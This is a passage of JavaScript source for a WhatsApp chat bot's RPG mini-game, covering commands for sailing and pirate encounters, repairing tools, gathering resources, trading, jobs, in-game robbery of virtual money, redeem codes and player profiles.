				if (!db.data.users[m.sender].rpg) return newReply(`*Join RPG First*\n\ntype _.joinrpg_`)
				if (!db.data.rpg[m.sender].ship) return newReply('You don\'t have a Ship, Please Craft a Ship first!')
				if (db.data.rpg[m.sender].shipHealth < 1) return newReply('Your Ship is Broken, Repair Your Ship First\n\nType .repair')
				if (pirates[m.sender]) return newReply("You are currently sailing!!")
				if (db.data.rpg[m.sender].region === args[0]) return newReply(`You are currently in ${args[0]}, Please choose another destination`)
				if (args[0] === "indonesia") {
					editp('Preparing supplies...', 'Releasing ship ropes...', 'Ship starts sailing away from the harbor...')
					let shipTypes = ["cargo", "cruise", "fishing", "warship", "tanker", "container", "ferry"]
					let crew = [14, 68, 64, 44, 24, 6, 8, 48, 32, 18, 10, 22, 6, 42, 12]
					let shipType = await pickRandom(shipTypes)
					let crewCount = await pickRandom(crew)
					db.data.rpg[m.sender].region = args[0]
					await sleep(10000)
					let text = `During the journey to\n${args[0]} you encounter\na *${shipType} ship*\nwith a crew of\n*${crewCount} people*, while your ship's\ncrew has *38 people*\n\n*Will you pirate this ship?*`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Attack🏴‍☠️\",\"id\":\"attack\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Skip Ship🏳️\",\"id\":\".surrender\"}`
					}]
					pirates[m.sender] = [
						await sock.sendButtonText(m.chat, button, `*PIRATE BATTLE 🏴‍☠️*\n`, text, footer, m), shipType, crewCount, args[0],
						setTimeout(() => {
							if (pirates[m.sender]) {
								db.data.rpg[m.sender].shipHealth = 0
								newReply("*You have been detected as a pirate, your ship was bombed by the military*")
								delete pirates[m.sender]
							}
						}, 120000)
					]
				} else if (args[0] === "india") {
					editp('Preparing supplies...', 'Releasing ship ropes...', 'Ship starts sailing away from the harbor...')
					let shipTypes = ["cargo", "cruise", "fishing", "warship", "tanker", "container", "ferry"]
					let crew = [14, 68, 64, 44, 24, 6, 8, 48, 32, 18, 10, 22, 6, 42, 12]
					let shipType = await pickRandom(shipTypes)
					let crewCount = await pickRandom(crew)
					db.data.rpg[m.sender].region = args[0]
					await sleep(10000)
					let text = `During the journey to\n${args[0]} you encounter\na *${shipType} ship*\nwith a crew of\n*${crewCount} people*, while your ship's\ncrew has *38 people*\n\n*Will you pirate this ship?*`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Attack🏴‍☠️\",\"id\":\"attack\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Skip Ship🏳️\",\"id\":\".surrender\"}`
					}]
					pirates[m.sender] = [
						await sock.sendButtonText(m.chat, button, `*PIRATE BATTLE 🏴‍☠️*\n`, text, footer, m), shipType, crewCount, args[0],
						setTimeout(() => {
							if (pirates[m.sender]) {
								db.data.rpg[m.sender].shipHealth = 0
								newReply("*You have been detected as a pirate, your ship was bombed by the military*")
								delete pirates[m.sender]
							}
						}, 120000)
					]
				} else if (args[0] === "brazil") {
					editp('Preparing supplies...', 'Releasing ship ropes...', 'Ship starts sailing away from the harbor...')
					let shipTypes = ["cargo", "cruise", "fishing", "warship", "tanker", "container", "ferry"]
					let crew = [14, 68, 64, 44, 24, 6, 8, 48, 32, 18, 10, 22, 6, 42, 12]
					let shipType = await pickRandom(shipTypes)
					let crewCount = await pickRandom(crew)
					db.data.rpg[m.sender].region = args[0]
					await sleep(10000)
					let text = `During the journey to\n${args[0]} you encounter\na *${shipType} ship*\nwith a crew of\n*${crewCount} people*, while your ship's\ncrew has *38 people*\n\n*Will you pirate this ship?*`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Attack🏴‍☠️\",\"id\":\"attack\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Skip Ship🏳️\",\"id\":\".surrender\"}`
					}]
					pirates[m.sender] = [
						await sock.sendButtonText(m.chat, button, `*PIRATE BATTLE 🏴‍☠️*\n`, text, footer, m), shipType, crewCount, args[0],
						setTimeout(() => {
							if (pirates[m.sender]) {
								db.data.rpg[m.sender].shipHealth = 0
								newReply("*You have been detected as a pirate, your ship was bombed by the military*")
								delete pirates[m.sender]
							}
						}, 120000)
					]
				} else if (args[0] === "russia") {
					editp('Preparing supplies...', 'Releasing ship ropes...', 'Ship starts sailing away from the harbor...')
					let shipTypes = ["cargo", "cruise", "fishing", "warship", "tanker", "container", "ferry"]
					let crew = [14, 68, 64, 44, 24, 6, 8, 48, 32, 18, 10, 22, 6, 42, 12]
					let shipType = await pickRandom(shipTypes)
					let crewCount = await pickRandom(crew)
					db.data.rpg[m.sender].region = args[0]
					await sleep(10000)
					let text = `During the journey to\n${args[0]} you encounter\na *${shipType} ship*\nwith a crew of\n*${crewCount} people*, while your ship's\ncrew has *38 people*\n\n*Will you pirate this ship?*`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Attack🏴‍☠️\",\"id\":\"attack\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Skip Ship🏳️\",\"id\":\".surrender\"}`
					}]
					pirates[m.sender] = [
						await sock.sendButtonText(m.chat, button, `*PIRATE BATTLE 🏴‍☠️*\n`, text, footer, m), shipType, crewCount, args[0],
						setTimeout(() => {
							if (pirates[m.sender]) {
								db.data.rpg[m.sender].shipHealth = 0
								newReply("*You have been detected as a pirate, your ship was bombed by the military*")
								delete pirates[m.sender]
							}
						}, 120000)
					]
				} else if (args[0] === "australia") {
					editp('Preparing supplies...', 'Releasing ship ropes...', 'Ship starts sailing away from the harbor...')
					let shipTypes = ["cargo", "cruise", "fishing", "warship", "tanker", "container", "ferry"]
					let crew = [14, 68, 64, 44, 24, 6, 8, 48, 32, 18, 10, 22, 6, 42, 12]
					let shipType = await pickRandom(shipTypes)
					let crewCount = await pickRandom(crew)
					db.data.rpg[m.sender].region = args[0]
					await sleep(10000)
					let text = `During the journey to\n${args[0]} you encounter\na *${shipType} ship*\nwith a crew of\n*${crewCount} people*, while your ship's\ncrew has *38 people*\n\n*Will you pirate this ship?*`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Attack🏴‍☠️\",\"id\":\"attack\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Skip Ship🏳️\",\"id\":\".surrender\"}`
					}]
					pirates[m.sender] = [
						await sock.sendButtonText(m.chat, button, `*PIRATE BATTLE 🏴‍☠️*\n`, text, footer, m), shipType, crewCount, args[0],
						setTimeout(() => {
							if (pirates[m.sender]) {
								db.data.rpg[m.sender].shipHealth = 0
								newReply("*You have been detected as a pirate, your ship was bombed by the military*")
								delete pirates[m.sender]
							}
						}, 120000)
					]
				} else if (args[0] === "canada") {
					editp('Preparing supplies...', 'Releasing ship ropes...', 'Ship starts sailing away from the harbor...')
					let shipTypes = ["cargo", "cruise", "fishing", "warship", "tanker", "container", "ferry"]
					let crew = [14, 68, 64, 44, 24, 6, 8, 48, 32, 18, 10, 22, 6, 42, 12]
					let shipType = await pickRandom(shipTypes)
					let crewCount = await pickRandom(crew)
					db.data.rpg[m.sender].region = args[0]
					await sleep(10000)
					let text = `During the journey to\n${args[0]} you encounter\na *${shipType} ship*\nwith a crew of\n*${crewCount} people*, while your ship's\ncrew has *38 people*\n\n*Will you pirate this ship?*`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Attack🏴‍☠️\",\"id\":\"attack\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Skip Ship🏳️\",\"id\":\".surrender\"}`
					}]
					pirates[m.sender] = [
						await sock.sendButtonText(m.chat, button, `*PIRATE BATTLE 🏴‍☠️*\n`, text, footer, m), shipType, crewCount, args[0],
						setTimeout(() => {
							if (pirates[m.sender]) {
								db.data.rpg[m.sender].shipHealth = 0
								newReply("*You have been detected as a pirate, your ship was bombed by the military*")
								delete pirates[m.sender]
							}
						}, 120000)
					]
				} else if (args[0] === "greenland") {
					editp('Preparing supplies...', 'Releasing ship ropes...', 'Ship starts sailing away from the harbor...')
					let shipTypes = ["cargo", "cruise", "fishing", "warship", "tanker", "container", "ferry"]
					let crew = [14, 68, 64, 44, 24, 6, 8, 48, 32, 18, 10, 22, 6, 42, 12]
					let shipType = await pickRandom(shipTypes)
					let crewCount = await pickRandom(crew)
					db.data.rpg[m.sender].region = args[0]
					await sleep(10000)
					let text = `During the journey to\n${args[0]} you encounter\na *${shipType} ship*\nwith a crew of\n*${crewCount} people*, while your ship's\ncrew has *38 people*\n\n*Will you pirate this ship?*`
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Attack🏴‍☠️\",\"id\":\"attack\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"Skip Ship🏳️\",\"id\":\".surrender\"}`
					}]
					pirates[m.sender] = [
						await sock.sendButtonText(m.chat, button, `*PIRATE BATTLE 🏴‍☠️*\n`, text, footer, m), shipType, crewCount, args[0],
						setTimeout(() => {
							if (pirates[m.sender]) {
								db.data.rpg[m.sender].shipHealth = 0
								newReply("*You have been detected as a pirate, your ship was bombed by the military*")
								delete pirates[m.sender]
							}
						}, 120000)
					]
				} else {
					let sail = "";
					sail += "*Choose Sailing Destination!*\n\n";
					sail += "🔵 indonesia\n";
					sail += "🔴 canada\n";
					sail += "⚪ russia\n";
					sail += "⚫ india\n";
					sail += "🟣 brazil\n";
					sail += "🟠 australia\n";
					sail += "🟢 greenland\n\n";
					sail += `Example:\n${prefix + command} russia\n`;
					await sock.sendMessage(m.chat, {
						text: sail,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: channel,
								serverMessageId: null,
								newsletterName: channelName
							},
							externalAdReply: {
								title: "PIRATE ADVENTURE",
								body: 'Sail across the ocean and go on adventures',
								thumbnailUrl: "https://telegra.ph/file/4275a0a1fcf450835b0ef.jpg",
								sourceUrl: wagc,
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				}
			}
			db.data.users[m.sender].limit -= 1;
			break

			case 'repair':
			case 'fix': {
				if (!db.data.users[m.sender].rpg) 
					return newReply(`⚠️ *You haven't joined the RPG yet!*\n\nType: _.joinrpg_ to start your adventure!`);
	
				let repairItem = args[0];
				let items = {
					ship: { name: "Ship", requirements: { iron: 5, wood: 10 }, health: "shipHealth" },
					pickaxe: { name: "Pickaxe", requirements: { iron: 1 }, health: "pickaxeHealth" },
					axe: { name: "Axe", requirements: { iron: 1 }, health: "axeHealth" },
					armor: { name: "Armor", requirements: { iron: 2 }, health: "armorHealth" },
					sword: { name: "Sword", requirements: { iron: 1 }, health: "swordHealth" }
				};

				if (!items[repairItem]) {
					let text = `-「 *TOOL REPAIR* 」-\n\n`;
					text += `🔧 *Choose item to repair:*\n`;
					text += ` 🛶 Ship\n ⛏️ Pickaxe\n 🪓 Axe\n 🛡️ Armor\n ⚔️ Sword\n\n`;
					text += `📌 *Usage example:*\n ${prefix + command} axe`;

					return sock.sendMessage(m.chat, {
						text: text,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: channel,
								serverMessageId: null,
								newsletterName: channelName
							},
							externalAdReply: {
								title: "🔧 RPG TOOLS REPAIR",
								body: "Repair tools and weapons",
								thumbnailUrl: "https://telegra.ph/file/08e78c20afd16dcebb33d.jpg",
								sourceUrl: wagc,
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, { quoted: m });
				}

				let item = items[repairItem];
				if (!db.data.rpg[m.sender][repairItem]) 
					return newReply(`⚠️ *You don't have ${item.name} yet!*\nCreate it first before repairing.`);

				if (db.data.rpg[m.sender][item.health] >= 100) 
					return newReply(`✅ *Your ${item.name} is still in good condition!*`);

				for (let [material, amount] of Object.entries(item.requirements)) {
					if (db.data.rpg[m.sender][material] < amount)
						return newReply(`⚠️ *You don't have enough ${material}!*\n\nRequires *${amount} ${material}* to repair ${item.name}.`);
				}

				for (let [material, amount] of Object.entries(item.requirements)) {
					db.data.rpg[m.sender][material] -= amount;
				}
				db.data.rpg[m.sender][item.health] = 100;

				editp("🔧 Repairing, please wait...", "🎨 Finishing stage...", "✅ Repair completed!");

				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'chop':
			case 'chopwood': {
				if (!db.data.users[m.sender].rpg) return newReply(`⚠️ *You haven't joined the RPG yet!*\n\nType: _.joinrpg_ to start your adventure!`);
				if (!db.data.rpg[m.sender].axe) return newReply(`🪓 *You don't have an axe!*\nCreate one first by typing: _.craft_`);
				if (db.data.rpg[m.sender].axeHealth < 1) return newReply(`💔 *Your axe is broken!*\nRepair it first before using again.\n\nType: _.repair_`);

				let wood = await randomNumber(5, 20);
				db.data.rpg[m.sender].wood += wood;
				db.data.rpg[m.sender].axeHealth -= 20;
				db.data.users[m.sender].limit -= 1;

				let message = `*🌲 CHOPPING TREES 🌲*\n\n`;
				message += `✅ *Chopping Results:*\n`;
				message += ` 🪵 Wood: ${wood}\n`;
				message += ` 🪓 Axe: -20 durability\n\n`;
				message += `Use wood for various purposes!`;

				newReply(message);
				break;
			}

			case 'hunt': {
				if (!db.data.users[m.sender].rpg) return newReply(`⚠️ *You haven't joined the RPG yet!*\n\nType: _.joinrpg_ to start your adventure!`);
	
				let cooldown = 7200000; // 2 hours
				let waitTime = new Date() - db.data.rpg[m.sender].huntTime;
				if (waitTime < cooldown) {
					let remainingTime = await clockString(cooldown - waitTime);
					return newReply(`⏳ *You just went hunting!*\nWait ${remainingTime} before you can hunt again.`);
				}
					let sheep = await randomNumber(1, 10);
	let cow = await randomNumber(1, 10);
	let chicken = await randomNumber(1, 10);
	let fur = Math.floor((sheep + cow + chicken) / 2);

	db.data.rpg[m.sender].huntTime = new Date() * 1;
	db.data.rpg[m.sender].sheep += sheep;
	db.data.rpg[m.sender].cow += cow;
	db.data.rpg[m.sender].chicken += chicken;
	db.data.rpg[m.sender].fur += fur;
	db.data.users[m.sender].limit -= 1;

	let message = `*🏹 HUNTING ANIMALS 🏹*\n\n`;
	message += `✅ *Hunting Results:*\n`;
	message += ` 🐏 Sheep: ${sheep}\n`;
	message += ` 🐄 Cow: ${cow}\n`;
	message += ` 🐔 Chicken: ${chicken}\n`;
	message += ` 🪶 Fur: ${fur}\n\n`;
	message += `_Wait 2 hours before hunting again!_`;

	newReply(message);
	break;
}

case 'adventure': {
	if (!db.data.users[m.sender].rpg) return newReply(`⚠️ *You haven't joined RPG!*\n\nJoin first by typing: _.joinrpg_`);
	if (db.data.rpg[m.sender].userHealth < 1) return newReply(`💔 *You're too weak to adventure!*\n\nUse potions/food to heal.\nType: _.heal_`);

	let destination = args.join(" ");
	let locationData = {
		"savannah": "https://telegra.ph/file/1b27b199f440cd69be0aa.jpg",
		"desert": "https://telegra.ph/file/760e27568c0b2ccf07231.jpg",
		"boreal forest": "https://telegra.ph/file/1a528cf0c7e1eb0e74976.jpg",
		"tropical forest": "https://telegra.ph/file/bbc4d8eb053479d69e5f7.jpg"
	};

	if (!locationData[destination]) {
		let locationList = Object.keys(locationData).map(l => `- ${l}`).join("\n");
		return sendAdventureMessage(m.chat, "Choose Your Exploration Location📍", locationList, "https://telegra.ph/file/6b9482a4ed6bd79c7a03e.jpg");
	}

	let explorationResults = {
		wood: await randomNumber(5, 15),
		iron: await randomNumber(3, 10),
		rank: await randomNumber(50, 100),
		money: await randomNumber(500, 2000),
		enemy: await pickRandom(["Evil Villager", "Zombie", "Ghasts", "Wither", "Skeleton", "Wild Wolf"])
	};

	db.data.rpg[m.sender].userHealth -= 20;
	db.data.rpg[m.sender].wood += explorationResults.wood;
	db.data.rpg[m.sender].iron += explorationResults.iron;
	db.data.rpg[m.sender].rank += explorationResults.rank;
	db.data.rpg[m.sender].money += explorationResults.money;
	db.data.users[m.sender].limit -= 1;

	await processAdventure(m.chat, destination, explorationResults, locationData[destination]);
	break;
}

case 'fishing':
case 'fish': {
	if (!db.data.users[m.sender].rpg) return newReply(`⚠️ *You haven't joined RPG!*\n\nJoin first by typing: _.joinrpg_`);
	if (db.data.rpg[m.sender].userHealth < 1) return newReply(`💔 *You're too weak to fish!*\n\nUse potions/food to heal.\nType: _.heal_`);

	let fish = await randomNumber(0, 20);
	db.data.rpg[m.sender].fish += fish;
	db.data.rpg[m.sender].userHealth -= 20;

	let thumb = [
		"https://telegra.ph/file/9b1f618a826fe7b3bed3e.jpg",
		"https://telegra.ph/file/2e772e9732c88e153e812.jpg",
		"https://telegra.ph/file/872b36a0dd7b6843f24da.jpg",
		"https://telegra.ph/file/562adf3d43cde4d355e76.jpg",
		"https://telegra.ph/file/7d641d46e96e9aace01dd.jpg"
	];
	let thumbnail = await pickRandom(thumb);

	let { key } = await sock.sendMessage(m.chat, {
		text: '🎣 *Fishing...*'
	}, { quoted: m });

	await sleep(5000);
	await sock.sendMessage(m.chat, {
		text: `🐟 *Getting Results...*`,
		edit: key
	});

	await sleep(5000);
	let txt = `🎣 *FISHING* 🎣\n\n`;
	txt += `✅ Successfully caught *${fish}* fish!\n\n`;
	txt += `⚠️ *Stamina decreased by -20*\n`;

	sock.sendMessage(m.chat, {
		text: txt,
		contextInfo: {
			mentionedJid: [m.sender],
			forwardingScore: 9999,
			isForwarded: true,
			forwardedNewsletterMessageInfo: {
				newsletterJid: channel,
				serverMessageId: null,
				newsletterName: channelName
			},
			externalAdReply: {
				title: "🎣 RPG - Fishing",
				body: "Let's catch as many fish as possible!",
				thumbnailUrl: thumbnail,
				sourceUrl: wagc,
				mediaType: 1,
				renderLargerThumbnail: true
			}
		}
	}, { quoted: m });

	db.data.users[m.sender].limit -= 1;
}
break;

case 'sell': {
	if (!db.data.users[m.sender].rpg) return newReply(`⚠️ *You haven't joined RPG!*\n\nJoin first by typing: _.joinrpg_`);

	let item = args[0];
	let amount = Number(args[1]);

	if (!item) return newReply(`📢 *Choose item to sell!*\n\nExample:\n${prefix + command} gold 2`);
	if (!args[1] || isNaN(amount)) return newReply(`⚠️ *Amount must be a number!*\n\nExample:\n${prefix + command} ${item} 2`);

	let itemPrices = {
		gold: 2500,
		iron: 1500,
		coal: 1000,
		silver: 2000,
		wood: 500,
		chicken: 500,
		cow: 3000,
		sheep: 2000,
		fish: 200
	};

	if (!itemPrices[item]) {
		let text = `🛍️ *Item Shop* 🛍️\n\n`;
		text += `Choose item you want to sell:\n`;
		text += Object.keys(itemPrices).map(item => `- ${item}`).join("\n") + "\n\n";
		text += `📌 *Sell example:*\n${prefix + command} gold 2`;

		return sock.sendMessage(m.chat, {
			text: text,
			contextInfo: {
				mentionedJid: [m.sender],
				forwardingScore: 9999,
				isForwarded: true,
				forwardedNewsletterMessageInfo: {
					newsletterJid: channel,
					serverMessageId: null,
					newsletterName: channelName
				},
				externalAdReply: {
					title: "🛒 Item Shop",
					body: 'Sell items to get money!',
					thumbnailUrl: "https://telegra.ph/file/df72d0f6cc35b7581594b.jpg",
					sourceUrl: wagc,
					mediaType: 1,
					renderLargerThumbnail: true
				}
			}
		}, { quoted: m });
	}

	if (db.data.rpg[m.sender][item] < amount) return newReply(`❌ *You don't have enough ${item}!*`);

	let money = amount * itemPrices[item];
	db.data.users[m.sender].money += money;
	db.data.rpg[m.sender][item] -= amount;

	let message = `✅ *Transaction Successful!*\n\n`;
	message += `📦 *Items Sold:*\n- ${item.charAt(0).toUpperCase() + item.slice(1)}: ${amount}\n\n`;
	message += `💰 *Money Earned:*\n+ Rp ${money.toLocaleString()}\n\n`;
	message += `🏦 *Current Balance:*\nRp ${db.data.users[m.sender].money.toLocaleString()}`;

	newReply(message);
}
break;

case 'shop':
case 'buy': {
	if (!db.data.users[m.sender].rpg) return newReply(`*⚠️ You haven't joined the RPG yet!*\n\n📌 Type: _${prefix}joinrpg_`);

	let items = {
		gold: 2500,
		iron: 1500,
		coal: 1000,
		silver: 2000,
		wood: 500,
		chicken: 500,
		cow: 3000,
		sheep: 2000,
		fish: 200
	};

	let buyItem = args[0]?.toLowerCase();
	let amount = parseInt(args[1]);

	if (!buyItem || !amount || isNaN(amount) || amount <= 0) {
		let priceList = Object.entries(items).map(([item, price]) => `- ${item} (Rp ${price}/unit)`).join("\n");
		return newReply(`🛍️ *MARKET - PRICE LIST* 🛍️\n\n${priceList}\n\n📌 Example: *${prefix}buy gold 2*`);
	}

	if (!items[buyItem]) return newReply(`⚠️ Item not found! Type *${prefix}buy* to see price list.`);

	let totalPrice = items[buyItem] * amount;
	if (db.data.users[m.sender].money < totalPrice) return newReply(`❌ *Your balance is insufficient!*\n💰 Price: Rp ${totalPrice}\n🔹 Current balance: Rp ${db.data.users[m.sender].money}`);

	db.data.users[m.sender].money -= totalPrice;
	db.data.rpg[m.sender][buyItem] = (db.data.rpg[m.sender][buyItem] || 0) + amount;

	let message = `🛍️ *MARKET - PURCHASE SUCCESSFUL* 🛍️\n\n`;
	message += `📦 *Item Bought:* ${buyItem} x${amount}\n`;
	message += `💰 *Total Paid:* Rp ${totalPrice}\n`;
	message += `💵 *Remaining Balance:* Rp ${db.data.users[m.sender].money}\n`;

	newReply(message);
}
break;

case 'work':
case 'job': {
	let type = (args[0] || '').toLowerCase();
	let cooldown = 600000; // 10 minutes
	let lastWork = db.data.rpg[m.sender].lastWork || 0;
	let remainingTime = cooldown - (new Date() - lastWork);

	if (remainingTime > 0) {
		return newReply(`⚠️ You already worked!\n💤 Time to rest for ${clockString(remainingTime)} before working again.`);
	}

	let jobs = {
		ojek: { 
			action: "delivering passengers", 
			item: pickRandom(['brother', 'uncle', 'high school girl', 'kids playing mobile legends', 'mother']), 
			emoji: "🚗" 
		},
		merchant: { 
			action: "selling goods", 
			item: pickRandom(['carrot', 'cabbage', 'lettuce', 'tomato', 'celery', 'chili', 'meat', 'fish', 'chicken']), 
			emoji: "🛒" 
		},
		doctor: { 
			action: "healing patients", 
			item: pickRandom(['headache', 'injury', 'burn', 'broken bone']), 
			emoji: "💉" 
		},
		farmer: { 
			action: "harvesting crops", 
			item: pickRandom(['Carrot', 'Cabbage', 'Strawberry', 'Tea', 'Rice', 'Orange', 'Banana', 'Watermelon', 'Durian', 'Rambutan']), 
			emoji: "🌾" 
		},
		mechanic: { 
			action: "repairing vehicles", 
			item: pickRandom(['car', 'motorcycle', 'pedicab', 'bajaj', 'bus', 'public minivan', 'bicycle']), 
			emoji: "🔧" 
		},
		laborer: { 
			action: "working on project", 
			item: pickRandom(['Building House', 'Building Building', 'Repairing House', 'Repairing Building', 'Building Public Facilities', 'Repairing Public Facilities']), 
			emoji: "🏗️" 
		}
	};

	if (!jobs[type]) {
		let jobList = Object.keys(jobs).map(job => `- ${job}`).join("\n");
		let guideMessage = `*💼 RPG - JOB 💼*\n\nChoose your job:\n${jobList}\n\n📌 *Example:* _${prefix + command} laborer_`;

		return sock.sendMessage(m.chat, {
			text: guideMessage,
			contextInfo: {
				mentionedJid: [m.sender],
				externalAdReply: {
					title: "RPG - JOB SIMULATOR",
					body: "Choose job and get results!",
					thumbnailUrl: "https://pomf2.lain.la/f/x1pvc1mq.jpg",
					sourceUrl: wagc,
					mediaType: 1,
					renderLargerThumbnail: true
				}
			}
		}, { quoted: m });
	}

	let salary = Math.floor(Math.random() * 10000);
	let job = jobs[type];

	newReply(`✅ You have been ${job.action} *${job.item}* ${job.emoji}\n💰 And earned money worth *Rp ${salary}*`).then(() => {
		db.data.users[m.sender].money += salary;
		db.data.rpg[m.sender].lastWork = new Date().getTime();
	});
}
break;

case 'rob':
case 'steal': {
	let cooldown = 3600000; // 1 hour
	let lastRob = db.data.rpg[m.sender].lastRob || 0;
	let remainingTime = cooldown - (new Date() - lastRob);

	if (remainingTime > 0) {
		return newReply(`⚠️ You already robbed!\n💤 Wait ${clockString(remainingTime)} before robbing again.`);
	}

	let target = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net');

	if (!target) {
		return newReply(`*🎭 Tag or Reply Target!*\n\n📌 Example:\n${prefix + command} @user`);
	}
	if (target === m.sender) {
		return newReply("⚠️ Can't rob yourself, dumbass! 😑");
	}
	if (!db.data.users[target]) {
		return newReply("⚠️ Target not found in database!");
	}

	let targetMoney = db.data.users[target].money || 0;
	if (targetMoney < 50000) {
		return newReply("🚨 Target is too poor to rob! 😭");
	}
	let successChance = Math.random() < 0.7; // 70% success, 30% fail
	let amount = Math.floor(Math.random() * 50000) + 10000; // Minimum 10k, maximum 50k

	if (successChance) {
		db.data.users[target].money -= amount;
		db.data.users[m.sender].money += amount;
		db.data.rpg[m.sender].lastRob = new Date().getTime();
		return newReply(`😈 **Success!** You robbed *Rp ${amount}* from @${target.split('@')[0]}! 💰`);
	} else {
		let penalty = Math.floor(amount * 0.5);
		db.data.users[m.sender].money -= penalty;
		db.data.rpg[m.sender].lastRob = new Date().getTime();
		return newReply(`🚔 **Failed!** Police caught you while robbing @${target.split('@')[0]}!\n👮‍♂️ You were fined *Rp ${penalty}*`);
	}
}
break;

case 'redeem': {
	db.redeem = db.redeem || {
		isRedeem: false,
		code: "",
		user: [],
		maxRedeem: 0
	}
	if (!db.redeem.isRedeem) return newReply("*Oops, no redeem code available yet! 😢*")
	if (!text) return newReply("*Enter the code first! 🧐*")

	if (db.redeem.isRedeem) {
		let code = text.toLowerCase()
		let redeem = db.redeem.code.toLowerCase()

		if (code !== redeem) return newReply("*Hmm... seems like the code is wrong! Please check again! 🤔*")
		if (db.redeem.maxRedeem < 1) return newReply("*Oops, this code has been used up! 😭*")
		if (db.redeem.user.includes(m.sender)) return newReply("*Hehe, you've already used this code before! Don't be greedy~ 😆*")

		// Add user to list of those who have redeemed
		db.redeem.user.push(m.sender)
		db.redeem.maxRedeem -= 1

		// Rewards received
		db.data.users[m.sender].money += 10000
		db.data.users[m.sender].exp += 1000
		db.data.users[m.sender].rank += 300
		db.data.users[m.sender].limit += 200

		let text = "";
		text += "*🎉 CONGRATULATIONS! YOU SUCCESSFULLY REDEEMED 🎉*\n\n";
		text += "*Rewards you received:*\n";
		text += "- 💰 Rp 10,000 balance\n";
		text += "- ⭐ 1000 EXP\n";
		text += "- 📊 300 Rank Points\n";
		text += "- 🎟️ 200 Limit\n\n";
		text += "*Use wisely! 😉*";

		newReply(text)

		// Delete redeem code after certain time if used up
		if (db.redeem.maxRedeem < 1) {
			await timeout(600000) // 10 minutes
			delete db.redeem
		}
	} else {
		newReply("*No active redeem session yet~ 😅*")
	}
}
break

case 'redeemset':
case 'setredeem': {
	if (!isCreator) return newReply(mess.owner)
	db.redeem = db.redeem || {
		isRedeem: false,
		code: "",
		user: [],
		maxRedeem: 0
	}
	if (!args[0]) return newReply(`*Oops, don't forget to enter the redeem code!* 🤓\n\nExample:\n${prefix + command} specialcode 10`)
	if (!args[1]) return newReply(`*How many times can this code be used? Enter the number!* 🔢\n\nExample:\n${prefix + command} specialcode 10`)
	if (isNaN(args[1])) return newReply(`*Amount must be a number! 😜*\n\nExample:\n${prefix + command} specialcode 10`)

	db.redeem.isRedeem = true
	db.redeem.code = args[0]
	db.redeem.user = []
	db.redeem.maxRedeem = args[1]

	newReply("*🎊 Redeem code successfully set! Get ready to share rewards! 🥳*")
}
break

case 'delredeem':
case 'redeemdel': {
	if (!isCreator) return newReply(mess.owner)
	db.redeem = db.redeem || {
		isRedeem: false,
		code: "",
		user: [],
		maxRedeem: 0
	}
	if (db.redeem.isRedeem) {
		newReply("*🚀 Redeem code successfully deleted! Now no one can redeem anymore!* 😎")
		delete db.redeem
	} else {
		newReply("*Oops, no active redeem code! 😅*")
	}
}
break
			case 'inventory':
			case 'inv':
			case 'profile':
			case 'profil': {
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.sender;
				if (!db.data.users[users].rpg) return newReply("*⚠️ You haven't joined RPG!*\n\nType _.joinrpg_ to start your adventure! 🏹");

				let phoneNumber = await PhoneNumber('+' + users.replace('@s.whatsapp.net', '')).getNumber('international');
	
				let text = `*⚔️ RPG - PROFILE ⚔️*\n\n`;
				text += `👤 *User Info*\n`;
				text += `- 📞 Number: ${phoneNumber}\n`;
				text += `- ❤️ Health: ${db.data.rpg[users].userHealth}/100\n`;
				text += `- 🌍 Location: ${db.data.rpg[users].region}\n\n`;

				text += `🛠️ *Crafting Items*\n`;
				text += `- ⛵ Ship: ${db.data.rpg[users].ship ? `(${db.data.rpg[users].shipHealth}% HP)` : 'Not owned' }\n`;
				text += `- 🏠 House: ${db.data.rpg[users].house} Unit(s)\n`;
				text += `- 🪓 Axe: ${db.data.rpg[users].axe ? `(${db.data.rpg[users].axeHealth}% HP)` : 'Not owned' }\n`;
				text += `- ⛏️ Pickaxe: ${db.data.rpg[users].pickaxe ? `(${db.data.rpg[users].pickaxeHealth}% HP)` : 'Not owned' }\n`;
				text += `- 🛡️ Armor: ${db.data.rpg[users].armor ? `(${db.data.rpg[users].armorHealth}% HP)` : 'Not owned' }\n`;
				text += `- ⚔️ Sword: ${db.data.rpg[users].sword ? `(${db.data.rpg[users].swordHealth}% HP)` : 'Not owned' }\n`;
				text += `- 🏴 Fabric: ${db.data.rpg[users].fabric} Sheet(s)\n\n`;

				text += `🔨 *Resources*\n`;
				text += `- 🪵 Wood: ${db.data.rpg[users].wood} Piece(s)\n`;
				text += `- ⛓️ Iron: ${db.data.rpg[users].iron} Piece(s)\n`;
				text += `- 💰 Gold: ${db.data.rpg[users].gold} Piece(s)\n`;
				text += `- 🥈 Silver: ${db.data.rpg[users].silver} Piece(s)\n`;
